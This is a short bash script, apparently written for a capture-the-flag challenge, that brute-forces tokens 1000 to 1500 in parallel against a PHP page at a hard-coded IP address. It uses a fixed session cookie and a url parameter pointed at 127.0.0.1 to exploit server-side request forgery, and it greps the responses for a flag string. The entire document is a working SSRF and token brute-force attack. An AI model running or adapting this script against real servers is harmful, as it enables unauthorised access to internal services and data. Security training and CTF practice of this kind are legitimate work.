#!/bin/bash

TARGET="http://16.171.15.52/home.php"
COOKIE="PHPSESSID=r2bfsab8kpukvltillm75t2lgp"

echo "[*] 🚀 Starting safer parallel SSRF scan..."

# 토큰 목록을 임시 파일에 저장
TOKENS=$(mktemp)
seq 1000 1500 > "$TOKENS"

# 각 줄(토큰)을 병렬 처리 (최대 10개)
cat "$TOKENS" | parallel -j 10 '
  TOKEN={}
  RESPONSE=$(curl -sG "'"$TARGET"'" \
    -H "Cookie: '"$COOKIE"'" \
    --data-urlencode "url=http://127.0.0.1/?token=$TOKEN")

  if echo "$RESPONSE" | grep -q "flag{"; then
    echo "[+] ✅ Found flag with token=$TOKEN"
    echo "$RESPONSE" | grep -oE "flag\{[^}]+\}"
  fi
'

rm "$TOKENS"
echo "[*] ✅ Scan complete."
